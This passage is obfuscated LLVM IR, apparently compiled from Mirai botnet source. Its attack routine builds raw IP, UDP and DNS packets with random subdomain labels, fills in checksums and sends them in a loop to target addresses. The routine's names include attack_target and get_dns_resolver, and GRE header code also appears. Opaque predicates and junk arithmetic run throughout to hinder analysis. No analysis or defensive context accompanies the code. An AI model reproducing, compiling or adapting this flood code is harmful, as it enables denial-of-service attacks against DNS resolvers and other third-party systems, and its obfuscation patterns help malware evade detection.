  %375 = getelementptr inbounds i8*, i8** %372, i64 %374
  %376 = load i8*, i8** %375, align 8
  store i8* %376, i8** %32, align 8
  %377 = load i8*, i8** %32, align 8
  %378 = bitcast i8* %377 to %struct.iphdr*
  store %struct.iphdr* %378, %struct.iphdr** %33, align 8
  %379 = load %struct.iphdr*, %struct.iphdr** %33, align 8
  %380 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %379, i64 1
  %381 = bitcast %struct.iphdr* %380 to %struct.udphdr*
  store %struct.udphdr* %381, %struct.udphdr** %34, align 8
  %382 = load %struct.udphdr*, %struct.udphdr** %34, align 8
  %383 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %382, i64 1
  %384 = bitcast %struct.udphdr* %383 to %struct.dnshdr*
  store %struct.dnshdr* %384, %struct.dnshdr** %35, align 8
  %385 = load %struct.dnshdr*, %struct.dnshdr** %35, align 8
  %386 = getelementptr inbounds %struct.dnshdr, %struct.dnshdr* %385, i64 1
  %387 = bitcast %struct.dnshdr* %386 to i8*
  %388 = getelementptr inbounds i8, i8* %387, i64 1
  store i8* %388, i8** %36, align 8
  %389 = load i16, i16* %13, align 2
  %390 = zext i16 %389 to i32
  %391 = icmp eq i32 %390, 65535
  %392 = load i32, i32* @x.37
  %393 = load i32, i32* @y.38
  %394 = sub i32 %392, 1
  %395 = mul i32 %392, %394
  %396 = urem i32 %395, 2
  %397 = icmp eq i32 %396, 0
  %398 = icmp slt i32 %393, 10
  %399 = or i1 %397, %398
  br i1 %399, label %originalBBpart286, label %originalBB84alteredBB

originalBBpart286:                                ; preds = %originalBB84
  br i1 %391, label %400, label %406

; <label>:400:                                    ; preds = %originalBBpart286
  %401 = call i32 @rand_next()
  %402 = and i32 %401, 65535
  %403 = trunc i32 %402 to i16
  %404 = load %struct.iphdr*, %struct.iphdr** %33, align 8
  %405 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %404, i32 0, i32 3
  store i16 %403, i16* %405, align 4
  br label %406

; <label>:406:                                    ; preds = %400, %originalBBpart286
  %407 = load i32, i32* @x.37
  %408 = load i32, i32* @y.38
  %409 = sub i32 %407, 1
  %410 = mul i32 %407, %409
  %411 = urem i32 %410, 2
  %412 = icmp eq i32 %411, 0
  %413 = icmp slt i32 %408, 10
  %414 = or i1 %412, %413
  br i1 %414, label %originalBB88, label %originalBB88alteredBB

originalBB88:                                     ; preds = %originalBB88alteredBB, %406
  %415 = load i16, i16* %16, align 2
  %416 = zext i16 %415 to i32
  %417 = icmp eq i32 %416, 65535
  %418 = load i32, i32* @x.37
  %419 = load i32, i32* @y.38
  %420 = sub i32 %418, 1
  %421 = mul i32 %418, %420
  %422 = urem i32 %421, 2
  %423 = icmp eq i32 %422, 0
  %424 = icmp slt i32 %419, 10
  %425 = or i1 %423, %424
  br i1 %425, label %originalBBpart290, label %originalBB88alteredBB

originalBBpart290:                                ; preds = %originalBB88
  br i1 %417, label %426, label %448

; <label>:426:                                    ; preds = %originalBBpart290
  %427 = load i32, i32* @x.37
  %428 = load i32, i32* @y.38
  %429 = sub i32 %427, 1
  %430 = mul i32 %427, %429
  %431 = urem i32 %430, 2
  %432 = icmp eq i32 %431, 0
  %433 = icmp slt i32 %428, 10
  %434 = or i1 %432, %433
  br i1 %434, label %originalBB92, label %originalBB92alteredBB

originalBB92:                                     ; preds = %originalBB92alteredBB, %426
  %435 = call i32 @rand_next()
  %436 = and i32 %435, 65535
  %437 = trunc i32 %436 to i16
  %438 = load %struct.udphdr*, %struct.udphdr** %34, align 8
  %439 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %438, i32 0, i32 0
  store i16 %437, i16* %439, align 2
  %440 = load i32, i32* @x.37
  %441 = load i32, i32* @y.38
  %442 = sub i32 %440, 1
  %443 = mul i32 %440, %442
  %444 = urem i32 %443, 2
  %445 = icmp eq i32 %444, 0
  %446 = icmp slt i32 %441, 10
  %447 = or i1 %445, %446
  br i1 %447, label %originalBBpart296, label %originalBB92alteredBB

originalBBpart296:                                ; preds = %originalBB92
  br label %448

; <label>:448:                                    ; preds = %originalBBpart296, %originalBBpart290
  %449 = load i16, i16* %17, align 2
  %450 = zext i16 %449 to i32
  %451 = icmp eq i32 %450, 65535
  br i1 %451, label %452, label %458

; <label>:452:                                    ; preds = %448
  %453 = call i32 @rand_next()
  %454 = and i32 %453, 65535
  %455 = trunc i32 %454 to i16
  %456 = load %struct.udphdr*, %struct.udphdr** %34, align 8
  %457 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %456, i32 0, i32 1
  store i16 %455, i16* %457, align 2
  br label %458

; <label>:458:                                    ; preds = %452, %448
  %459 = load i16, i16* %18, align 2
  %460 = zext i16 %459 to i32
  %461 = icmp eq i32 %460, 65535
  br i1 %461, label %462, label %468

; <label>:462:                                    ; preds = %458
  %463 = call i32 @rand_next()
  %464 = and i32 %463, 65535
  %465 = trunc i32 %464 to i16
  %466 = load %struct.dnshdr*, %struct.dnshdr** %35, align 8
  %467 = getelementptr inbounds %struct.dnshdr, %struct.dnshdr* %466, i32 0, i32 0
  store i16 %465, i16* %467, align 2
  br label %468

; <label>:468:                                    ; preds = %462, %458
  %469 = load i32, i32* @x.37
  %470 = load i32, i32* @y.38
  %471 = sub i32 %469, 1
  %472 = mul i32 %469, %471
  %473 = urem i32 %472, 2
  %474 = icmp eq i32 %473, 0
  %475 = icmp slt i32 %470, 10
  %476 = or i1 %474, %475
  br i1 %476, label %originalBB98, label %originalBB98alteredBB

originalBB98:                                     ; preds = %originalBB98alteredBB, %468
  %477 = load i8*, i8** %36, align 8
  %478 = load i8, i8* %19, align 1
  %479 = zext i8 %478 to i32
  call void @rand_alpha_str(i8* %477, i32 %479)
  %480 = load %struct.iphdr*, %struct.iphdr** %33, align 8
  %481 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %480, i32 0, i32 7
  store i16 0, i16* %481, align 2
  %482 = load %struct.iphdr*, %struct.iphdr** %33, align 8
  %483 = bitcast %struct.iphdr* %482 to i16*
  %484 = call zeroext i16 @checksum_generic(i16* %483, i32 20)
  %485 = load %struct.iphdr*, %struct.iphdr** %33, align 8
  %486 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %485, i32 0, i32 7
  store i16 %484, i16* %486, align 2
  %487 = load %struct.udphdr*, %struct.udphdr** %34, align 8
  %488 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %487, i32 0, i32 3
  store i16 0, i16* %488, align 2
  %489 = load %struct.iphdr*, %struct.iphdr** %33, align 8
  %490 = load %struct.udphdr*, %struct.udphdr** %34, align 8
  %491 = bitcast %struct.udphdr* %490 to i8*
  %492 = load %struct.udphdr*, %struct.udphdr** %34, align 8
  %493 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %492, i32 0, i32 2
  %494 = load i16, i16* %493, align 2
  %495 = load i8, i8* %19, align 1
  %496 = zext i8 %495 to i64
  %497 = add i64 21, %496
  %498 = add i64 %497, 2
  %499 = load i32, i32* %21, align 4
  %500 = sext i32 %499 to i64
  %501 = add i64 %498, %500
  %502 = add i64 %501, 4
  %503 = trunc i64 %502 to i32
  %504 = call zeroext i16 @checksum_tcpudp(%struct.iphdr* %489, i8* %491, i16 zeroext %494, i32 %503)
  %505 = load %struct.udphdr*, %struct.udphdr** %34, align 8
  %506 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %505, i32 0, i32 3
  store i16 %504, i16* %506, align 2
  %507 = load i32, i32* %22, align 4
  %508 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %509 = load i32, i32* %9, align 4
  %510 = sext i32 %509 to i64
  %511 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %508, i64 %510
  %512 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %511, i32 0, i32 0
  %513 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %512, i32 0, i32 2
  %514 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %513, i32 0, i32 0
  store i32 %507, i32* %514, align 4
  %515 = load %struct.udphdr*, %struct.udphdr** %34, align 8
  %516 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %515, i32 0, i32 1
  %517 = load i16, i16* %516, align 2
  %518 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %519 = load i32, i32* %9, align 4
  %520 = sext i32 %519 to i64
  %521 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %518, i64 %520
  %522 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %521, i32 0, i32 0
  %523 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %522, i32 0, i32 1
  store i16 %517, i16* %523, align 2
  %524 = load i32, i32* %10, align 4
  %525 = load i8*, i8** %32, align 8
  %526 = load i8, i8* %19, align 1
  %527 = zext i8 %526 to i64
  %528 = add i64 41, %527
  %529 = add i64 %528, 2
  %530 = load i32, i32* %21, align 4
  %531 = sext i32 %530 to i64
  %532 = add i64 %529, %531
  %533 = add i64 %532, 4
  %534 = bitcast %union.__CONST_SOCKADDR_ARG* %37 to %struct.sockaddr**
  %535 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %536 = load i32, i32* %9, align 4
  %537 = sext i32 %536 to i64
  %538 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %535, i64 %537
  %539 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %538, i32 0, i32 0
  %540 = bitcast %struct.sockaddr_in* %539 to %struct.sockaddr*
  store %struct.sockaddr* %540, %struct.sockaddr** %534, align 8
  %541 = getelementptr inbounds %union.__CONST_SOCKADDR_ARG, %union.__CONST_SOCKADDR_ARG* %37, i32 0, i32 0
  %542 = load %struct.sockaddr*, %struct.sockaddr** %541, align 8
  %543 = call i64 @sendto(i32 %524, i8* %525, i64 %533, i32 16384, %struct.sockaddr* %542, i32 16)
  %544 = load i32, i32* @x.37
  %545 = load i32, i32* @y.38
  %546 = sub i32 %544, 1
  %547 = mul i32 %544, %546
  %548 = urem i32 %547, 2
  %549 = icmp eq i32 %548, 0
  %550 = icmp slt i32 %545, 10
  %551 = or i1 %549, %550
  br i1 %551, label %originalBBpart2162, label %originalBB98alteredBB

originalBBpart2162:                               ; preds = %originalBB98
  br label %552

; <label>:552:                                    ; preds = %originalBBpart2162
  %553 = load i32, i32* %9, align 4
  %554 = add nsw i32 %553, 1
  store i32 %554, i32* %9, align 4
  br label %358

; <label>:555:                                    ; preds = %358
  br label %357

; <label>:556:                                    ; preds = %92, %86, %80
  ret void

originalBBalteredBB:                              ; preds = %originalBB, %101
  store i8 0, i8* %24, align 1
  store i8 0, i8* %25, align 1
  %557 = call noalias i8* @calloc(i64 600, i64 1) #6
  %558 = load i8**, i8*** %11, align 8
  %559 = load i32, i32* %9, align 4
  %560 = sext i32 %559 to i64
  %561 = getelementptr inbounds i8*, i8** %558, i64 %560
  store i8* %557, i8** %561, align 8
  %562 = load i8**, i8*** %11, align 8
  %563 = load i32, i32* %9, align 4
  %564 = sext i32 %563 to i64
  %565 = getelementptr inbounds i8*, i8** %562, i64 %564
  %566 = load i8*, i8** %565, align 8
  %567 = bitcast i8* %566 to %struct.iphdr*
  store %struct.iphdr* %567, %struct.iphdr** %26, align 8
  %568 = load %struct.iphdr*, %struct.iphdr** %26, align 8
  %569 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %568, i64 1
  %570 = bitcast %struct.iphdr* %569 to %struct.udphdr*
  store %struct.udphdr* %570, %struct.udphdr** %27, align 8
  %571 = load %struct.udphdr*, %struct.udphdr** %27, align 8
  %572 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %571, i64 1
  %573 = bitcast %struct.udphdr* %572 to %struct.dnshdr*
  store %struct.dnshdr* %573, %struct.dnshdr** %28, align 8
  %574 = load %struct.dnshdr*, %struct.dnshdr** %28, align 8
  %575 = getelementptr inbounds %struct.dnshdr, %struct.dnshdr* %574, i64 1
  %576 = bitcast %struct.dnshdr* %575 to i8*
  store i8* %576, i8** %29, align 8
  %577 = load %struct.iphdr*, %struct.iphdr** %26, align 8
  %578 = bitcast %struct.iphdr* %577 to i8*
  %579 = load i8, i8* %578, align 4
  %_ = shl i8 %579, 15
  %_1 = sub i8 0, %579
  %gen = add i8 %_1, 15
  %580 = and i8 %579, 15
  %_2 = sub i8 0, %580
  %gen3 = add i8 %_2, 64
  %_4 = shl i8 %580, 64
  %_5 = sub i8 %580, 64
  %gen6 = mul i8 %_5, 64
  %_7 = sub i8 0, %580
  %gen8 = add i8 %_7, 64
  %581 = or i8 %580, 64
  store i8 %581, i8* %578, align 4
  %582 = load %struct.iphdr*, %struct.iphdr** %26, align 8
  %583 = bitcast %struct.iphdr* %582 to i8*
  %584 = load i8, i8* %583, align 4
  %_9 = shl i8 %584, -16
  %_10 = sub i8 %584, -16
  %gen11 = mul i8 %_10, -16
  %585 = and i8 %584, -16
  %_12 = sub i8 0, %585
  %gen13 = add i8 %_12, 5
  %_14 = sub i8 %585, 5
  %gen15 = mul i8 %_14, 5
  %_16 = sub i8 0, %585
  %gen17 = add i8 %_16, 5
  %_18 = sub i8 0, %585
  %gen19 = add i8 %_18, 5
  %_20 = sub i8 0, %585
  %gen21 = add i8 %_20, 5
  %_22 = sub i8 0, %585
  %gen23 = add i8 %_22, 5
  %_24 = sub i8 %585, 5
  %gen25 = mul i8 %_24, 5
  %586 = or i8 %585, 5
  store i8 %586, i8* %583, align 4
  %587 = load i8, i8* %12, align 1
  %588 = load %struct.iphdr*, %struct.iphdr** %26, align 8
  %589 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %588, i32 0, i32 1
  store i8 %587, i8* %589, align 1
  %590 = load i8, i8* %19, align 1
  %591 = zext i8 %590 to i64
  %_26 = sub i64 0, 41
  %gen27 = add i64 %_26, %591
  %_28 = shl i64 41, %591
  %592 = add i64 41, %591
  %_29 = sub i64 0, %592
  %gen30 = add i64 %_29, 2
  %_31 = shl i64 %592, 2
  %_32 = sub i64 0, %592
  %gen33 = add i64 %_32, 2
  %_34 = sub i64 0, %592
  %gen35 = add i64 %_34, 2
  %_36 = sub i64 0, %592
  %gen37 = add i64 %_36, 2
  %_38 = sub i64 0, %592
  %gen39 = add i64 %_38, 2
  %593 = add i64 %592, 2
  %594 = load i32, i32* %21, align 4
  %595 = sext i32 %594 to i64
  %_40 = shl i64 %593, %595
  %_41 = sub i64 0, %593
  %gen42 = add i64 %_41, %595
  %596 = add i64 %593, %595
  %_43 = sub i64 0, %596
  %gen44 = add i64 %_43, 4
  %_45 = shl i64 %596, 4
  %_46 = shl i64 %596, 4
  %_47 = sub i64 %596, 4
  %gen48 = mul i64 %_47, 4
  %_49 = sub i64 %596, 4
  %gen50 = mul i64 %_49, 4
  %597 = add i64 %596, 4
  %598 = trunc i64 %597 to i16
  %599 = call zeroext i16 @htons(i16 zeroext %598) #7
  %600 = load %struct.iphdr*, %struct.iphdr** %26, align 8
  %601 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %600, i32 0, i32 2
  store i16 %599, i16* %601, align 2
  %602 = load i16, i16* %13, align 2
  %603 = call zeroext i16 @htons(i16 zeroext %602) #7
  %604 = load %struct.iphdr*, %struct.iphdr** %26, align 8
  %605 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %604, i32 0, i32 3
  store i16 %603, i16* %605, align 4
  %606 = load i8, i8* %14, align 1
  %607 = load %struct.iphdr*, %struct.iphdr** %26, align 8
  %608 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %607, i32 0, i32 5
  store i8 %606, i8* %608, align 4
  %609 = load i8, i8* %15, align 1
  %610 = icmp ne i8 %609, 0
  br label %originalBB

originalBB51alteredBB:                            ; preds = %originalBB51, %229
  %611 = load i32, i32* %23, align 4
  %612 = load i32, i32* %21, align 4
  %613 = icmp slt i32 %611, %612
  br label %originalBB51

originalBB55alteredBB:                            ; preds = %originalBB55, %249
  %614 = load i8*, i8** %20, align 8
  %615 = load i32, i32* %23, align 4
  %616 = sext i32 %615 to i64
  %617 = getelementptr inbounds i8, i8* %614, i64 %616
  %618 = load i8, i8* %617, align 1
  %619 = sext i8 %618 to i32
  %620 = icmp eq i32 %619, 46
  br label %originalBB55

originalBB59alteredBB:                            ; preds = %originalBB59, %287
  %621 = load i32, i32* %23, align 4
  %_60 = shl i32 %621, 1
  %_61 = sub i32 %621, 1
  %gen62 = mul i32 %_61, 1
  %622 = add nsw i32 %621, 1
  store i32 %622, i32* %23, align 4
  br label %originalBB59

originalBB66alteredBB:                            ; preds = %originalBB66, %306
  %623 = load i8, i8* %24, align 1
  %624 = load i8*, i8** %30, align 8
  store i8 %623, i8* %624, align 1
  %625 = load i8*, i8** %29, align 8
  %626 = load i32, i32* %21, align 4
  %627 = sext i32 %626 to i64
  %628 = getelementptr inbounds i8, i8* %625, i64 %627
  %629 = getelementptr inbounds i8, i8* %628, i64 2
  %630 = bitcast i8* %629 to %struct.grehdr*
  store %struct.grehdr* %630, %struct.grehdr** %31, align 8
  %631 = call zeroext i16 @htons(i16 zeroext 1) #7
  %632 = load %struct.grehdr*, %struct.grehdr** %31, align 8
  %633 = getelementptr inbounds %struct.grehdr, %struct.grehdr* %632, i32 0, i32 0
  store i16 %631, i16* %633, align 2
  %634 = call zeroext i16 @htons(i16 zeroext 1) #7
  %635 = load %struct.grehdr*, %struct.grehdr** %31, align 8
  %636 = getelementptr inbounds %struct.grehdr, %struct.grehdr* %635, i32 0, i32 1
  store i16 %634, i16* %636, align 2
  br label %originalBB66

originalBB70alteredBB:                            ; preds = %originalBB70, %337
  %637 = load i32, i32* %9, align 4
  %_71 = sub i32 0, %637
  %gen72 = add i32 %_71, 1
  %_73 = sub i32 %637, 1
  %gen74 = mul i32 %_73, 1
  %_75 = sub i32 %637, 1
  %gen76 = mul i32 %_75, 1
  %_77 = sub i32 0, %637
  %gen78 = add i32 %_77, 1
  %_79 = sub i32 0, %637
  %gen80 = add i32 %_79, 1
  %638 = add nsw i32 %637, 1
  store i32 %638, i32* %9, align 4
  br label %originalBB70

originalBB84alteredBB:                            ; preds = %originalBB84, %363
  %639 = load i8**, i8*** %11, align 8
  %640 = load i32, i32* %9, align 4
  %641 = sext i32 %640 to i64
  %642 = getelementptr inbounds i8*, i8** %639, i64 %641
  %643 = load i8*, i8** %642, align 8
  store i8* %643, i8** %32, align 8
  %644 = load i8*, i8** %32, align 8
  %645 = bitcast i8* %644 to %struct.iphdr*
  store %struct.iphdr* %645, %struct.iphdr** %33, align 8
  %646 = load %struct.iphdr*, %struct.iphdr** %33, align 8
  %647 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %646, i64 1
  %648 = bitcast %struct.iphdr* %647 to %struct.udphdr*
  store %struct.udphdr* %648, %struct.udphdr** %34, align 8
  %649 = load %struct.udphdr*, %struct.udphdr** %34, align 8
  %650 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %649, i64 1
  %651 = bitcast %struct.udphdr* %650 to %struct.dnshdr*
  store %struct.dnshdr* %651, %struct.dnshdr** %35, align 8
  %652 = load %struct.dnshdr*, %struct.dnshdr** %35, align 8
  %653 = getelementptr inbounds %struct.dnshdr, %struct.dnshdr* %652, i64 1
  %654 = bitcast %struct.dnshdr* %653 to i8*
  %655 = getelementptr inbounds i8, i8* %654, i64 1
  store i8* %655, i8** %36, align 8
  %656 = load i16, i16* %13, align 2
  %657 = zext i16 %656 to i32
  %658 = icmp eq i32 %657, 65535
  br label %originalBB84

originalBB88alteredBB:                            ; preds = %originalBB88, %406
  %659 = load i16, i16* %16, align 2
  %660 = zext i16 %659 to i32
  %661 = icmp eq i32 %660, 65535
  br label %originalBB88

originalBB92alteredBB:                            ; preds = %originalBB92, %426
  %662 = call i32 @rand_next()
  %_93 = sub i32 %662, 65535
  %gen94 = mul i32 %_93, 65535
  %663 = and i32 %662, 65535
  %664 = trunc i32 %663 to i16
  %665 = load %struct.udphdr*, %struct.udphdr** %34, align 8
  %666 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %665, i32 0, i32 0
  store i16 %664, i16* %666, align 2
  br label %originalBB92

originalBB98alteredBB:                            ; preds = %originalBB98, %468
  %667 = load i8*, i8** %36, align 8
  %668 = load i8, i8* %19, align 1
  %669 = zext i8 %668 to i32
  call void @rand_alpha_str(i8* %667, i32 %669)
  %670 = load %struct.iphdr*, %struct.iphdr** %33, align 8
  %671 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %670, i32 0, i32 7
  store i16 0, i16* %671, align 2
  %672 = load %struct.iphdr*, %struct.iphdr** %33, align 8
  %673 = bitcast %struct.iphdr* %672 to i16*
  %674 = call zeroext i16 @checksum_generic(i16* %673, i32 20)
  %675 = load %struct.iphdr*, %struct.iphdr** %33, align 8
  %676 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %675, i32 0, i32 7
  store i16 %674, i16* %676, align 2
  %677 = load %struct.udphdr*, %struct.udphdr** %34, align 8
  %678 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %677, i32 0, i32 3
  store i16 0, i16* %678, align 2
  %679 = load %struct.iphdr*, %struct.iphdr** %33, align 8
  %680 = load %struct.udphdr*, %struct.udphdr** %34, align 8
  %681 = bitcast %struct.udphdr* %680 to i8*
  %682 = load %struct.udphdr*, %struct.udphdr** %34, align 8
  %683 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %682, i32 0, i32 2
  %684 = load i16, i16* %683, align 2
  %685 = load i8, i8* %19, align 1
  %686 = zext i8 %685 to i64
  %_99 = sub i64 21, %686
  %gen100 = mul i64 %_99, %686
  %_101 = shl i64 21, %686
  %_102 = sub i64 21, %686
  %gen103 = mul i64 %_102, %686
  %_104 = shl i64 21, %686
  %_105 = shl i64 21, %686
  %687 = add i64 21, %686
  %_106 = shl i64 %687, 2
  %_107 = shl i64 %687, 2
  %_108 = sub i64 0, %687
  %gen109 = add i64 %_108, 2
  %_110 = sub i64 %687, 2
  %gen111 = mul i64 %_110, 2
  %688 = add i64 %687, 2
  %689 = load i32, i32* %21, align 4
  %690 = sext i32 %689 to i64
  %_112 = sub i64 0, %688
  %gen113 = add i64 %_112, %690
  %_114 = sub i64 %688, %690
  %gen115 = mul i64 %_114, %690
  %_116 = sub i64 %688, %690
  %gen117 = mul i64 %_116, %690
  %_118 = sub i64 0, %688
  %gen119 = add i64 %_118, %690
  %_120 = sub i64 %688, %690
  %gen121 = mul i64 %_120, %690
  %_122 = shl i64 %688, %690
  %_123 = sub i64 0, %688
  %gen124 = add i64 %_123, %690
  %_125 = sub i64 %688, %690
  %gen126 = mul i64 %_125, %690
  %691 = add i64 %688, %690
  %_127 = sub i64 0, %691
  %gen128 = add i64 %_127, 4
  %_129 = sub i64 %691, 4
  %gen130 = mul i64 %_129, 4
  %_131 = shl i64 %691, 4
  %692 = add i64 %691, 4
  %693 = trunc i64 %692 to i32
  %694 = call zeroext i16 @checksum_tcpudp(%struct.iphdr* %679, i8* %681, i16 zeroext %684, i32 %693)
  %695 = load %struct.udphdr*, %struct.udphdr** %34, align 8
  %696 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %695, i32 0, i32 3
  store i16 %694, i16* %696, align 2
  %697 = load i32, i32* %22, align 4
  %698 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %699 = load i32, i32* %9, align 4
  %700 = sext i32 %699 to i64
  %701 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %698, i64 %700
  %702 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %701, i32 0, i32 0
  %703 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %702, i32 0, i32 2
  %704 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %703, i32 0, i32 0
  store i32 %697, i32* %704, align 4
  %705 = load %struct.udphdr*, %struct.udphdr** %34, align 8
  %706 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %705, i32 0, i32 1
  %707 = load i16, i16* %706, align 2
  %708 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %709 = load i32, i32* %9, align 4
  %710 = sext i32 %709 to i64
  %711 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %708, i64 %710
  %712 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %711, i32 0, i32 0
  %713 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %712, i32 0, i32 1
  store i16 %707, i16* %713, align 2
  %714 = load i32, i32* %10, align 4
  %715 = load i8*, i8** %32, align 8
  %716 = load i8, i8* %19, align 1
  %717 = zext i8 %716 to i64
  %_132 = sub i64 0, 41
  %gen133 = add i64 %_132, %717
  %_134 = sub i64 0, 41
  %gen135 = add i64 %_134, %717
  %718 = add i64 41, %717
  %_136 = sub i64 %718, 2
  %gen137 = mul i64 %_136, 2
  %_138 = sub i64 %718, 2
  %gen139 = mul i64 %_138, 2
  %_140 = sub i64 0, %718
  %gen141 = add i64 %_140, 2
  %_142 = shl i64 %718, 2
  %_143 = sub i64 %718, 2
  %gen144 = mul i64 %_143, 2
  %_145 = sub i64 0, %718
  %gen146 = add i64 %_145, 2
  %_147 = sub i64 %718, 2
  %gen148 = mul i64 %_147, 2
  %719 = add i64 %718, 2
  %720 = load i32, i32* %21, align 4
  %721 = sext i32 %720 to i64
  %_149 = shl i64 %719, %721
  %_150 = shl i64 %719, %721
  %_151 = sub i64 %719, %721
  %gen152 = mul i64 %_151, %721
  %_153 = sub i64 0, %719
  %gen154 = add i64 %_153, %721
  %_155 = shl i64 %719, %721
  %722 = add i64 %719, %721
  %_156 = shl i64 %722, 4
  %_157 = sub i64 %722, 4
  %gen158 = mul i64 %_157, 4
  %_159 = sub i64 0, %722
  %gen160 = add i64 %_159, 4
  %723 = add i64 %722, 4
  %724 = bitcast %union.__CONST_SOCKADDR_ARG* %37 to %struct.sockaddr**
  %725 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %726 = load i32, i32* %9, align 4
  %727 = sext i32 %726 to i64
  %728 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %725, i64 %727
  %729 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %728, i32 0, i32 0
  %730 = bitcast %struct.sockaddr_in* %729 to %struct.sockaddr*
  store %struct.sockaddr* %730, %struct.sockaddr** %724, align 8
  %731 = getelementptr inbounds %union.__CONST_SOCKADDR_ARG, %union.__CONST_SOCKADDR_ARG* %37, i32 0, i32 0
  %732 = load %struct.sockaddr*, %struct.sockaddr** %731, align 8
  %733 = call i64 @sendto(i32 %714, i8* %715, i64 %723, i32 16384, %struct.sockaddr* %732, i32 16)
  br label %originalBB98
}

; Function Attrs: noinline nounwind uwtable
define internal i32 @get_dns_resolver() #0 {
  %1 = load i32, i32* @x.39
  %2 = load i32, i32* @y.40
  %3 = sub i32 %1, 1
  %4 = mul i32 %1, %3
  %5 = urem i32 %4, 2
  %6 = icmp eq i32 %5, 0
  %7 = icmp slt i32 %2, 10
  %8 = or i1 %6, %7
  br i1 %8, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %0
  %9 = alloca i32, align 4
  %10 = alloca i32, align 4
  %11 = alloca i32, align 4
  %12 = alloca i32, align 4
  %13 = alloca [2048 x i8], align 16
  %14 = alloca i32, align 4
  %15 = alloca [32 x i8], align 16
  %16 = alloca i8, align 1
  %17 = alloca i8, align 1
  %18 = alloca i8, align 1
  call void @table_unlock_val(i8 zeroext 21)
  %19 = call i8* @table_retrieve_val(i32 21, i32* null)
  %20 = call i32 (i8*, i32, ...) @open(i8* %19, i32 0)
  store i32 %20, i32* %10, align 4
  call void @table_lock_val(i8 zeroext 21)
  %21 = load i32, i32* %10, align 4
  %22 = icmp sge i32 %21, 0
  %23 = load i32, i32* @x.39
  %24 = load i32, i32* @y.40
  %25 = sub i32 %23, 1
  %26 = mul i32 %23, %25
  %27 = urem i32 %26, 2
  %28 = icmp eq i32 %27, 0
  %29 = icmp slt i32 %24, 10
  %30 = or i1 %28, %29
  br i1 %30, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br i1 %22, label %31, label %287

; <label>:31:                                     ; preds = %originalBBpart2
  %32 = load i32, i32* @x.39
  %33 = load i32, i32* @y.40
  %34 = sub i32 %32, 1
  %35 = mul i32 %32, %34
  %36 = urem i32 %35, 2
  %37 = icmp eq i32 %36, 0
  %38 = icmp slt i32 %33, 10
  %39 = or i1 %37, %38
  br i1 %39, label %originalBB1, label %originalBB1alteredBB

originalBB1:                                      ; preds = %originalBB1alteredBB, %31
  %40 = load i32, i32* %10, align 4
  %41 = getelementptr inbounds [2048 x i8], [2048 x i8]* %13, i32 0, i32 0
  %42 = call i64 @read(i32 %40, i8* %41, i64 2048)
  %43 = trunc i64 %42 to i32
  store i32 %43, i32* %11, align 4
  %44 = load i32, i32* %10, align 4
  %45 = call i32 @close(i32 %44)
  call void @table_unlock_val(i8 zeroext 22)
  %46 = getelementptr inbounds [2048 x i8], [2048 x i8]* %13, i32 0, i32 0
  %47 = load i32, i32* %11, align 4
  %48 = call i8* @table_retrieve_val(i32 22, i32* null)
  %49 = call i32 @util_stristr(i8* %46, i32 %47, i8* %48)
  store i32 %49, i32* %12, align 4
  call void @table_lock_val(i8 zeroext 22)
  %50 = load i32, i32* %12, align 4
  %51 = icmp ne i32 %50, -1
  %52 = load i32, i32* @x.39
  %53 = load i32, i32* @y.40
  %54 = sub i32 %52, 1
  %55 = mul i32 %52, %54
  %56 = urem i32 %55, 2
  %57 = icmp eq i32 %56, 0
  %58 = icmp slt i32 %53, 10
  %59 = or i1 %57, %58
  br i1 %59, label %originalBBpart24, label %originalBB1alteredBB

originalBBpart24:                                 ; preds = %originalBB1
  br i1 %51, label %60, label %270

; <label>:60:                                     ; preds = %originalBBpart24
  store i8 0, i8* %16, align 1
  store i8 0, i8* %17, align 1
  %61 = load i32, i32* %12, align 4
